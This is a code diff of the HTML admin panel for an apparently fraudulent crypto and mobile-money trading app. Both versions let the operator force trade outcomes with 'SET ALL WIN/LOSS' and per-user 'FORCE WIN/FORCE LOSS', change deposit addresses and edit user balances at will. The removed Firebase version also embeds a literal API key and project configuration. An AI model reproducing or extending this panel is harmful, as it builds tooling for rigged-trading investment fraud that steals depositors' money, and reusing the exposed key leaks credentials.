@@ -1,71 +1,202 @@
 <!DOCTYPE html>
-<html>
-<head><title>Admin Control Panel</title><script src="https://cdn.tailwindcss.com"></script></head>
-<body class="bg-black text-white p-6">
-    <h1 class="text-3xl font-black text-yellow-500 mb-8 uppercase italic tracking-tighter">System Master Admin</h1>
-    
-    <div class="bg-gray-900 p-6 rounded-3xl border border-gray-800 mb-8">
-        <h2 class="text-xs text-gray-500 font-bold mb-4 uppercase tracking-widest">Live Trade Signal</h2>
-        <div class="flex gap-4">
-            <button onclick="setMode('win')" class="flex-1 bg-green-600 py-5 rounded-2xl font-black text-xl shadow-lg shadow-green-900/30">SET ALL WIN</button>
-            <button onclick="setMode('loss')" class="flex-1 bg-red-600 py-5 rounded-2xl font-black text-xl shadow-lg shadow-red-900/30">SET ALL LOSS</button>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>G-Terminal | Admin Control</title>
+    <style>
+        :root {
+            --bg: #0a0c10;
+            --card: #161a1e;
+            --accent: #f0b90b; /* Binance Gold */
+            --green: #02c076;
+            --red: #f6465d;
+            --text: #ffffff;
+        }
+
+        body {
+            background-color: var(--bg);
+            color: var(--text);
+            font-family: 'Segoe UI', sans-serif;
+            margin: 0;
+            display: flex;
+        }
+
+        /* Sidebar */
+        .sidebar {
+            width: 250px;
+            background: var(--card);
+            height: 100vh;
+            padding: 20px;
+            border-right: 1px solid #2b3139;
+            position: fixed;
+        }
+
+        .main-content {
+            margin-left: 290px;
+            padding: 30px;
+            width: 100%;
+        }
+
+        .card {
+            background: var(--card);
+            padding: 20px;
+            border-radius: 12px;
+            margin-bottom: 20px;
+            border: 1px solid #2b3139;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 15px;
+        }
+
+        th, td {
+            padding: 12px;
+            text-align: left;
+            border-bottom: 1px solid #2b3139;
+        }
+
+        .btn {
+            padding: 6px 12px;
+            border-radius: 4px;
+            border: none;
+            cursor: pointer;
+            font-weight: bold;
+            font-size: 0.8rem;
+        }
+
+        .btn-approve { background: var(--green); color: white; }
+        .btn-reject { background: var(--red); color: white; }
+        .btn-save { background: var(--accent); color: black; margin-top: 10px; width: 100%; padding: 12px; }
+
+        input, select {
+            background: #2b3139;
+            border: 1px solid #474d57;
+            color: white;
+            padding: 8px;
+            border-radius: 4px;
+        }
+
+        .badge {
+            padding: 4px 8px;
+            border-radius: 4px;
+            font-size: 0.7rem;
+            text-transform: uppercase;
+        }
+
+        .status-pending { background: #f0b90b33; color: #f0b90b; }
+
+        h2 { color: var(--accent); border-bottom: 2px solid var(--accent); display: inline-block; padding-bottom: 5px; }
+    </style>
+</head>
+<body>
+
+    <div class="sidebar">
+        <h2 style="font-size: 1.2rem;">ADMIN PANEL</h2>
+        <p style="color: #848e9c;">Welcome, Master</p>
+        <hr style="border: 0.5px solid #2b3139;">
+        <nav>
+            <p>📊 Dashboard</p>
+            <p>👤 User KYC</p>
+            <p>💰 Deposits</p>
+            <p>💸 Withdrawals</p>
+            <p>⚙️ Global Settings</p>
+            <p style="margin-top: 50px; color: var(--red); cursor: pointer;">Logout</p>
+        </nav>
+    </div>
+
+    <div class="main-content">
+        <div class="card">
+            <h3>⚙️ Global App Settings</h3>
+            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
+                <div>
+                    <label>Admin USDT (TRC20) Address:</label><br>
+                    <input type="text" id="admin_usdt" value="T9yD...7x89" style="width: 100%;">
+                </div>
+                <div>
+                    <label>Minimum Deposit ($):</label><br>
+                    <input type="number" value="10" style="width: 100%;">
+                </div>
+            </div>
+            <button class="btn btn-save" onclick="alert('Settings Updated Globally!')">Update All User View</button>
+        </div>
+
+        <div class="card">
+            <h3>👤 Active Users & Trade Force</h3>
+            <table>
+                <thead>
+                    <tr>
+                        <th>User ID</th>
+                        <th>Balance</th>
+                        <th>KYC Status</th>
+                        <th>Trade Control</th>
+                        <th>Action</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>user_9921</td>
+                        <td>$1,250.00</td>
+                        <td><span class="badge status-pending">Pending</span></td>
+                        <td>
+                            <select>
+                                <option>Normal Market</option>
+                                <option style="color: var(--green);">FORCE WIN</option>
+                                <option style="color: var(--red);">FORCE LOSS</option>
+                            </select>
+                        </td>
+                        <td>
+                            <button class="btn btn-approve">Approve</button>
+                            <button class="btn btn-reject">Reject</button>
+                        </td>
+                    </tr>
+                    <tr>
+                        <td>trader_khan</td>
+                        <td>$450.00</td>
+                        <td><span class="badge" style="background: rgba(2, 192, 118, 0.2); color: var(--green);">Approved</span></td>
+                        <td>
+                            <select>
+                                <option>Normal Market</option>
+                                <option selected style="color: var(--red);">FORCE LOSS</option>
+                            </select>
+                        </td>
+                        <td>
+                            <button class="btn btn-reject">Suspend</button>
+                        </td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+
+        <div class="card">
+            <h3>💸 Withdrawal Requests</h3>
+            <table>
+                <thead>
+                    <tr>
+                        <th>User</th>
+                        <th>Amount</th>
+                        <th>Method</th>
+                        <th>Address</th>
+                        <th>Action</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>user_9921</td>
+                        <td>$500.00</td>
+                        <td>USDT (TRC20)</td>
+                        <td><code style="color: var(--accent);">TR7NHqfjy...</code></td>
+                        <td>
+                            <button class="btn btn-approve">Release Funds</button>
+                        </td>
+                    </tr>
+                </tbody>
+            </table>
         </div>
     </div>
 
-    <div class="bg-gray-900 p-6 rounded-3xl border border-gray-800 mb-8">
-        <h2 class="text-xs text-blue-500 font-bold mb-4 uppercase tracking-widest">Recharge Settings</h2>
-        <div class="space-y-4">
-            <input type="text" id="ep" placeholder="Easypaisa: 03xx-xxxxxxx | Name" class="w-full bg-black p-4 rounded-2xl outline-none border border-gray-700 text-sm">
-            <input type="text" id="jc" placeholder="JazzCash: 03xx-xxxxxxx | Name" class="w-full bg-black p-4 rounded-2xl outline-none border border-gray-700 text-sm">
-            <input type="text" id="usdt" placeholder="USDT TRC20 Address" class="w-full bg-black p-4 rounded-2xl outline-none border border-gray-700 text-sm">
-            <button onclick="savePay()" class="w-full bg-blue-600 py-4 rounded-2xl font-black uppercase text-xs tracking-widest shadow-lg shadow-blue-900/40">Update All Addresses</button>
-        </div>
-    </div>
-
-    <h2 class="text-xs text-gray-500 font-bold mb-4 uppercase tracking-widest">Active Traders</h2>
-    <div id="users" class="space-y-4"></div>
-
-    <script type="module">
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-app.js";
-        import { getDatabase, ref, update, onValue, get } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-database.js";
-
-        const firebaseConfig = {
-            apiKey: "AIzaSyCM_qmcvOXXjJrQHPiracy5SOpTjAJEnYU",
-            authDomain: "trade-for-profit-8b160.firebaseapp.com",
-            databaseURL: "https://trade-for-profit-8b160-default-rtdb.firebaseio.com",
-            projectId: "trade-for-profit-8b160",
-            storageBucket: "trade-for-profit-8b160.firebasestorage.app",
-            messagingSenderId: "1077014018991",
-            appId: "1:1077014018991:web:24f051595ac36857fd4d5a"
-        };
-        const app = initializeApp(firebaseConfig);
-        const db = getDatabase(app);
-
-        window.setMode = (m) => update(ref(db, 'liveSettings'), { status: m }).then(() => alert("All trades will now: " + m.toUpperCase()));
-        
-        window.savePay = () => update(ref(db, 'paymentSettings'), {
-            easypaisa: document.getElementById('ep').value,
-            jazzcash: document.getElementById('jc').value,
-            usdt: document.getElementById('usdt').value
-        }).then(() => alert("Addresses Updated Successfully!"));
-
-        onValue(ref(db, 'users'), (snap) => {
-            const data = snap.val(); const list = document.getElementById('users'); list.innerHTML = '';
-            for(let id in data) {
-                list.innerHTML += `<div class="bg-gray-900 p-5 rounded-3xl border border-gray-800 flex justify-between items-center">
-                    <div><p class="text-xs text-blue-400 font-bold">${data[id].email}</p><p class="text-2xl font-black text-yellow-500 mt-1">RS ${data[id].balance || 0}</p></div>
-                    <div class="flex gap-2">
-                        <button onclick="addBal('${id}', 1000)" class="bg-white text-black px-4 py-2 rounded-xl font-black text-[10px]">+1000</button>
-                        <button onclick="addBal('${id}', -1000)" class="bg-red-600 text-white px-4 py-2 rounded-xl font-black text-[10px]">-1000</button>
-                    </div>
-                </div>`;
-            }
-        });
-
-        window.addBal = (uid, amt) => {
-            const r = ref(db, 'users/' + uid);
-            get(r).then(s => update(r, { balance: (s.val().balance || 0) + amt }));
-        };
-    </script>
 </body>
-</html>
+    </html>
+    
